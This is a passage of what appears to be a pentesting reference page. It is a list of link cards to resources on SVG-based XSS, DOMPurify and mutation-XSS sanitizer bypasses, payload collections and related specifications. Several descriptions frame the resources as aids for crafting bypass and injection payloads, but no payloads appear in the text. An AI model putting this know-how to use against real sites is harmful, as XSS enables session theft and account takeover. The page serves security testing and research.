  title: "HackTricks — SVG XSS"
  icon: i-lucide-book-open
  to: https://book.hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/index.html
  target: _blank
  ---
  Community reference covering SVG-based XSS payloads, file upload exploitation, Markdown injection, and real-world bypass techniques.
  ::

  ::card
  ---
  title: "DOMPurify Bypass Research"
  icon: i-simple-icons-github
  to: https://github.com/nicksahler/DOMPurify/security/advisories
  target: _blank
  ---
  History of DOMPurify bypass discoveries. Understanding past bypasses helps craft new ones and assess current sanitizer effectiveness.
  ::

  ::card
  ---
  title: "Cure53 — mXSS Research Papers"
  icon: i-lucide-file-text
  to: https://cure53.de/fp170.pdf
  target: _blank
  ---
  Cure53's mutation XSS research covering SVG namespace confusion, parser differentials, and sanitizer bypass through DOM mutation.
  ::

  ::card
  ---
  title: "Payload All The Things — SVG Injection"
  icon: i-simple-icons-github
  to: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection
  target: _blank
  ---
  Massive payload collection including SVG XSS vectors, Markdown injection payloads, file upload bypasses, and sanitizer evasion strings.
  ::

  ::card
  ---
  title: "CommonMark Specification"
  icon: i-lucide-book-open
  to: https://spec.commonmark.org/
  target: _blank
  ---
  The CommonMark Markdown specification. Understanding how raw HTML blocks and inline HTML are defined helps craft parser-specific injection payloads.
  ::

  ::card
  ---
  title: "MDN — SVG Element Reference"
  icon: i-simple-icons-mdnwebdocs
  to: https://developer.mozilla.org/en-US/docs/Web/SVG/Element
  target: _blank
  ---
  Complete SVG element reference. Essential for discovering lesser-known SVG elements and attributes that may bypass sanitizer allowlists.
  ::

  ::card
  ---
  title: "CWE-434 — Unrestricted Upload of Dangerous File"
  icon: i-lucide-shield-alert
  to: https://cwe.mitre.org/data/definitions/434.html
  target: _blank
  ---
  MITRE CWE entry for dangerous file upload vulnerabilities. The root cause classification for SVG upload XSS.
  ::

  ::card
  ---
  title: "HTML5 Security Cheatsheet"
  icon: i-lucide-shield
  to: https://html5sec.org/
  target: _blank
  ---
  Comprehensive database of HTML5 attack vectors including SVG-specific payloads, namespace confusion attacks, and browser-specific rendering quirks.
  ::

  ::card
  ---
  title: "PortSwigger — XSS Cheat Sheet (SVG)"
  icon: i-simple-icons-portswigger
  to: https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
  target: _blank
  ---
  Interactive XSS payload database with SVG-specific filters. Search by tag (svg), event (onload, onbegin), and browser version for targeted payloads.
  ::
::